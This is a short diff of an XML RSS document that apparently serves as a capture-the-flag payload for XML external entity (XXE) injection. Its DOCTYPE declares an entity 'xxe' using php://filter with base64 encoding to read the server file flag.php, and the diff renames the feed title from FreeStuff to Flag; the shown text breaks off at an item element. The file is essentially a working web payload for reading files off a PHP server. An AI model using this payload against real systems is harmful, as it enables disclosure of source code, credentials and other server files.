@@ -1,10 +1,10 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE title [  
-   <!ELEMENT title ANY >
+   
    <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php" >]>
 <rss>
 <channel>
-  <title>FreeStuff</title>
+  <title>Flag</title>
   <link>http://www.w3schools.com</link>
   <description>Free web building tutorials</description>
   <item>
